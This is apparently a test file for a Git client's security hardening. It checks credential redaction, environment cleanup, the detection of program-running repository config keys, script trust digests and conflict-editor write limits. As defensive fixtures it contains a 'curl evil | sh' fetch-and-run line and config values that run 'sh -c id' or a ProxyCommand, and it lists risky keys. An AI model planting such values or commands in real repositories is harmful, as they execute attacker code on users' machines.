// Security hardening from the 2026-10-09 skills audit, on real Git where it
// matters: credentials never reach the journal, no program lookup in the
// repository folder, a repository's own config cannot run a program on a read
// unseen, and the conflict editor writes only to a conflicted regular file.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { access, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { CommandLog } from '../../main/command-log.js';
import { runGit } from '../../main/git/exec.js';
import { redactCredentials } from '../../main/git/redact.js';
import { gitReason } from '../../main/git/commit-ops.js';
import { hardenProcessEnv } from '../../main/process-env.js';
import { findRiskyConfig, isRiskyConfigKey } from '../../main/git/config-risk.js';
import { loadConflict, saveResolution } from '../../main/git/conflicts.js';
import { isLaunchable } from '../../main/editor.js';
import { digestBytes, readRepoConfig } from '../../main/automation/discovery.js';
import { runAction } from '../../main/automation/actions.js';
import { mkdir } from 'node:fs/promises';

// --- credentials in URLs ------------------------------------------------
assert.equal(redactCredentials('origin\thttps://ghp_abc@github.com/a/b (fetch)'), 'origin\thttps://***@github.com/a/b (fetch)');
assert.equal(redactCredentials('https://user:pa/ss@host/x'), 'https://***@host/x', 'a password holding / is cut too');
assert.equal(redactCredentials('ssh://user:pw@host/r'), 'ssh://***@host/r');
assert.equal(redactCredentials('ssh://git@host/r'), 'ssh://git@host/r', 'a bare SSH user is not a secret');
assert.equal(redactCredentials('git@github.com:a/b'), 'git@github.com:a/b');
assert.equal(redactCredentials('https://github.com/a/b@v1'), 'https://github.com/a/b@v1', 'an @ in the path is not userinfo');
assert.equal(redactCredentials('no url here'), 'no url here');
assert.equal(redactCredentials(null), null);
assert.match(gitReason({ stderr: "fatal: unable to access 'https://u:p/q@h/r/': 403" }), /https:\/\/\*\*\*@h\/r/);

// --- process environment -------------------------------------------------
const win = hardenProcessEnv({ PATH: 'C:\\Git\\cmd;;' }, 'win32');
assert.equal(win.NoDefaultCurrentDirectoryInExePath, '1', 'Windows: no program lookup in the working directory');
const posix = hardenProcessEnv({ PATH: '/usr/bin::.:bin:/bin', LD_LIBRARY_PATH: '/opt/twig:', DYLD_LIBRARY_PATH: ':' }, 'linux');
assert.equal(posix.PATH, '/usr/bin:/bin', 'empty and relative PATH entries go');
assert.equal(posix.LD_LIBRARY_PATH, '/opt/twig', 'the trailing ":" of an AppImage runtime goes');
assert.equal('DYLD_LIBRARY_PATH' in posix, false, 'a path of nothing but the current directory is removed');

// --- launchable types on Windows/Linux "System default" -------------------
for (const file of ['run.py', 'help.chm', 'x.appinstaller', 'disk.iso', 'a.settingcontent-ms', 'tool.exe', 'start.sh']) {
  assert.equal(isLaunchable(file), true, `must not open with the system default: ${file}`);
}
for (const file of ['README.md', 'app.ts', 'notes.txt', 'image.png']) assert.equal(isLaunchable(file), false, file);

// --- config keys that run a program on a read -----------------------------
for (const key of ['core.fsmonitor', 'core.sshCommand', 'filter.x.clean', 'filter.x.process', 'diff.x.textconv',
  'diff.external', 'credential.helper', 'credential.https://h.helper', 'gpg.program', 'gpg.ssh.program',
  'include.path', 'includeIf.gitdir:/x/.path']) assert.equal(isRiskyConfigKey(key), true, key);
for (const key of ['core.hooksPath', 'user.name', 'remote.origin.url', 'filter.x.required', 'core.editor']) {
  assert.equal(isRiskyConfigKey(key), false, key);
}

// A commit-message regex that backtracks forever fails the step instead of freezing main.
{
  const started = Date.now();
  const step = await runAction({ action: { type: 'validateMessage', rule: { mode: 'regex', pattern: '^(a+)+$' } },
    context: { commitMessage: `${'a'.repeat(40)}!` }, cwd: tmpdir(), log: null });
  assert.equal(step.status, 'failed');
  assert.match(step.detail, /took too long/);
  assert.ok(Date.now() - started < 5000);
  const fine = await runAction({ action: { type: 'validateMessage', rule: { mode: 'regex', pattern: '^feat' } },
    context: { commitMessage: 'feat: x' }, cwd: tmpdir(), log: null });
  assert.equal(fine.status, 'passed');
}

const directory = await mkdtemp(path.join(tmpdir(), 'twig-hardening-'));
const git = (cwd, ...argv) => execFileSync('git', argv, { cwd, encoding: 'utf8', env: { ...process.env, GIT_CONFIG_NOSYSTEM: '1' } });
try {
  const log = new CommandLog(path.join(directory, 'state'));
  await log.load();
  const repo = path.join(directory, 'repo');
  git(directory, 'init', '-q', '--initial-branch=main', repo);
  git(repo, 'config', 'user.name', 'T');
  git(repo, 'config', 'user.email', 't@example.com');

  // Journal: a remote URL with a token, printed by an allowed console command.
  git(repo, 'remote', 'add', 'origin', 'https://ghp_SECRET123@example.invalid/a/b.git');
  const remotes = await runGit({ argv: ['remote', '-v'], cwd: repo, log, operation: 'Console command' });
  assert.equal(remotes.code, 0);
  const journal = await readFile(path.join(directory, 'state', 'command-log.jsonl'), 'utf8');
  assert.equal(journal.includes('ghp_SECRET123'), false, 'the token never reaches the journal file');
  assert.equal(JSON.stringify(log.list()).includes('ghp_SECRET123'), false, 'nor the console');
  await runGit({ argv: ['ls-remote', '--get-url', 'https://tok:pw@example.invalid/x'], cwd: repo, log, operation: 'Console command' });
  assert.equal(JSON.stringify(log.list()).includes('tok:pw'), false, 'a credential in argv is cut out as well');

  // Clean repository config: nothing to warn about, LFS filters included.
  git(repo, 'config', 'filter.lfs.clean', 'git-lfs clean -- %f');
  git(repo, 'config', 'filter.lfs.process', 'git-lfs filter-process');
  git(repo, 'config', 'core.fsmonitor', 'true');
  git(repo, 'config', 'core.hooksPath', '.husky');
  // Everyday local settings: SSH signing, a keychain helper, a deploy key.
  git(repo, 'config', 'gpg.format', 'ssh');
  git(repo, 'config', 'gpg.ssh.program', 'ssh-keygen');
  git(repo, 'config', 'gpg.program', '/opt/homebrew/bin/gpg');
  git(repo, 'config', 'credential.helper', 'osxkeychain');
  git(repo, 'config', 'core.sshCommand', 'ssh -i ~/.ssh/deploy_key -o IdentitiesOnly=yes');
  assert.deepEqual(await findRiskyConfig(repo, log), []);
  // The same keys pointing at something planted still ask.
  git(repo, 'config', 'gpg.ssh.program', `${repo}/tools/ssh-keygen`);
  git(repo, 'config', 'gpg.program', './gpg');
  git(repo, 'config', 'credential.helper', '!sh -c id');
  git(repo, 'config', 'core.sshCommand', 'ssh -o ProxyCommand=id');
  assert.deepEqual((await findRiskyConfig(repo, log)).map(item => item.key).sort(),
    ['core.sshcommand', 'credential.helper', 'gpg.program', 'gpg.ssh.program']);
  for (const key of ['gpg.ssh.program', 'gpg.program', 'credential.helper', 'core.sshCommand', 'gpg.format']) git(repo, 'config', '--unset', key);
  assert.deepEqual(await findRiskyConfig(repo, log), []);

  // A hostile config: every program-running key is reported with its value,
  // and Twig's own status read does not run the fsmonitor command.
  const marker = path.join(directory, 'fsmonitor-ran');
  git(repo, 'config', 'core.fsmonitor', `touch '${marker}'; false`);
  git(repo, 'config', 'filter.evil.clean', 'sh -c id');
  git(repo, 'config', 'core.sshCommand', 'sh -c id');
  const risky = await findRiskyConfig(path.join(repo), log);
  assert.deepEqual(risky.map(item => item.key).sort(), ['core.fsmonitor', 'core.sshcommand', 'filter.evil.clean']);
  assert.ok(risky.every(item => item.value.includes('id') || item.value.includes('touch')));
  assert.equal(log.list().filter(entry => entry.operation.startsWith('Read repository config')).every(entry => entry.code === 0), true,
    'the probe never shows up as a failure in the journal');
  const status = await runGit({ argv: ['status', '--porcelain=v2', '-z'], cwd: repo, log, operation: 'Background: read working tree status' });
  assert.equal(status.code, 0);
  await assert.rejects(access(marker), 'core.fsmonitor from the repository config did not run');
  git(repo, 'config', '--unset', 'core.fsmonitor');
  git(repo, 'config', '--unset', 'filter.evil.clean');
  git(repo, 'config', '--unset', 'core.sshCommand');
  assert.deepEqual(await findRiskyConfig(path.join(directory), log), [], 'a folder outside any repository has no config to fear');

  // Automation trust covers the scripts a repository pipeline runs, not only its JSON.
  await mkdir(path.join(repo, '.twig'), { recursive: true });
  const hooks = JSON.stringify({ pipelines: [{ id: 'p1', name: 'Check', event: 'pre-commit', enabled: true,
    actions: [{ id: 'a1', type: 'script', path: 'tools/check.sh', args: '' }] }] });
  await writeFile(path.join(repo, '.twig', 'hooks.json'), hooks);
  const before = await readRepoConfig(repo);
  assert.notEqual(before.digest, digestBytes(hooks), 'a script action folds its file into the digest');
  await mkdir(path.join(repo, 'tools'), { recursive: true });
  await writeFile(path.join(repo, 'tools', 'check.sh'), 'echo ok\n');
  const approved = await readRepoConfig(repo);
  assert.notEqual(approved.digest, before.digest, 'creating the script changes the digest');
  await writeFile(path.join(repo, 'tools', 'check.sh'), 'curl evil | sh\n');
  assert.notEqual((await readRepoConfig(repo)).digest, approved.digest, 'editing an approved script asks for trust again');
  const plain = JSON.stringify({ pipelines: [{ id: 'p2', name: 'Lint', event: 'pre-commit', enabled: true,
    actions: [{ id: 'a2', type: 'command', command: 'npm test' }] }] });
  await writeFile(path.join(repo, '.twig', 'hooks.json'), plain);
  assert.equal((await readRepoConfig(repo)).digest, digestBytes(plain), 'without scripts the digest is the JSON alone — earlier approvals hold');
  await rm(path.join(repo, '.twig'), { recursive: true });
  await rm(path.join(repo, 'tools'), { recursive: true });

  // Conflict editor: only an unmerged regular file inside the tree.
  await writeFile(path.join(repo, 'a.txt'), 'base\n');
  git(repo, 'add', 'a.txt');
  git(repo, 'commit', '-qm', 'base');
  git(repo, 'switch', '-qc', 'side');
  await writeFile(path.join(repo, 'a.txt'), 'side\n');
  git(repo, 'commit', '-qam', 'side');
  git(repo, 'switch', '-q', 'main');
  await writeFile(path.join(repo, 'a.txt'), 'main\n');
  await writeFile(path.join(repo, 'clean.txt'), 'clean\n');
  git(repo, 'add', '.');
  git(repo, 'commit', '-qm', 'main');
  try { git(repo, 'merge', '-q', 'side'); } catch { /* the conflict is the point */ }

  const conflict = await loadConflict({ cwd: repo, log, path: 'a.txt' });
  assert.match(conflict.merged, /<<<<<<</);
  await assert.rejects(loadConflict({ cwd: repo, log, path: 'clean.txt' }), /no longer in conflict/);
  await assert.rejects(saveResolution({ cwd: repo, log, path: '.git/config', content: 'x', mtimeMs: 0, size: 0 }), /Invalid file path/);
  await assert.rejects(saveResolution({ cwd: repo, log, path: '.GIT/hooks/pre-commit', content: 'x', mtimeMs: 0, size: 0 }), /Invalid file path/);
  const outside = path.join(directory, 'outside.txt');
  await writeFile(outside, 'outside\n');
  await symlink(outside, path.join(repo, 'link.txt'));
  await assert.rejects(saveResolution({ cwd: repo, log, path: 'link.txt', content: 'x', mtimeMs: 0, size: 0 }), /not a regular file/);
  assert.equal(await readFile(outside, 'utf8'), 'outside\n', 'nothing was written through the link');
  await saveResolution({ cwd: repo, log, path: 'a.txt', content: 'resolved\n', mtimeMs: conflict.mtimeMs, size: conflict.size });
  assert.equal(await readFile(path.join(repo, 'a.txt'), 'utf8'), 'resolved\n');
  assert.equal(git(repo, 'ls-files', '--unmerged'), '', 'the resolution is staged');
} finally {
  await rm(directory, { recursive: true, force: true });
}

console.log('hardening check passed: credential redaction, process env, risky config, conflict writes, launchable types.');
